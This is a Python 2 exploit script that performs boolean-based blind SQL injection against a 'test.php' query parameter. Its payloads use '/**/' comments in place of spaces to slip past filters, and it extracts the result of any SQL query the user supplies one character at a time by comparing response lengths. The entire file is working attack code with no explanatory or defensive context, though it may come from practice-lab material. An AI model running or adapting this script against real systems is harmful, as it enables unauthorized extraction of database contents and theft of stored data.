import sys
import re
import requests
from bs4 import BeautifulSoup

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def searchFriends_sqli(ip, inj_str):
	mid = 79
	target = "http://%s/test.php?q=%s" % (ip, inj_str.replace("[CHAR]",str(mid)).replace("[COMP]",">"))
	r = requests.get(target, verify=False, proxies=proxies)
	content_length = int(r.headers['Content-Length'])
	if (content_length > 20):
		mid = 103
		target = "http://%s/test.php?q=%s" % (ip, inj_str.replace("[CHAR]",str(mid)).replace("[COMP]",">"))
		r = requests.get(target, verify=False, proxies=proxies)
		content_length = int(r.headers['Content-Length'])
		if (content_length > 20):
			for j in range(103, 127):
				target = "http://%s/test.php?q=%s" % (ip, inj_str.replace("[CHAR]",str(j)).replace("[COMP]","="))
				r = requests.get(target, verify=False, proxies=proxies)
				content_length = int(r.headers['Content-Length'])
				if (content_length > 20):
					return j
		else:
			for j in range(79, 104):
				target = "http://%s/test.php?q=%s" % (ip, inj_str.replace("[CHAR]",str(j)).replace("[COMP]","="))
				r = requests.get(target, verify=False, proxies=proxies)
				content_length = int(r.headers['Content-Length'])
				if (content_length > 20):
					return j
	else:
		mid = 55
		target = "http://%s/test.php?q=%s" % (ip, inj_str.replace("[CHAR]",str(mid)).replace("[COMP]",">"))
		r = requests.get(target, verify=False, proxies=proxies)
		content_length = int(r.headers['Content-Length'])
		if (content_length > 20):
			for j in range(55, 80):
				target = "http://%s/test.php?q=%s" % (ip, inj_str.replace("[CHAR]",str(j)).replace("[COMP]","="))
				r = requests.get(target, verify=False, proxies=proxies)
				content_length = int(r.headers['Content-Length'])
				if (content_length > 20):
					return j
		else:
			for j in range(31, 56):
				target = "http://%s/test.php?q=%s" % (ip, inj_str.replace("[CHAR]",str(j)).replace("[COMP]","="))
				r = requests.get(target, verify=False, proxies=proxies)
				content_length = int(r.headers['Content-Length'])
				if (content_length > 20):
					return j
	return 0
			

            


def main():
    if len(sys.argv) != 3:
        print "(+) usage: %s <target> <query>" % sys.argv[0]
        print '(+) eg: %s 192.168.1.100 "select version"' %sys.argv[0]
    ip = sys.argv[1]
    command = sys.argv[2]

    print "(+) Retrieving " + command

    for i in range(1,2000):
        injection_string = "test')/**/or/**/(ascii(substring((" + command +"),%d,1)))[COMP][CHAR]%%23" % i
        extracted_int = searchFriends_sqli(ip, injection_string)
        if(extracted_int == 0):
			break
        else:
			extracted_chr = chr(extracted_int)
        sys.stdout.write(extracted_chr)
        sys.stdout.flush()
    print"\n(+) done!"

if __name__ == "__main__":
    main()
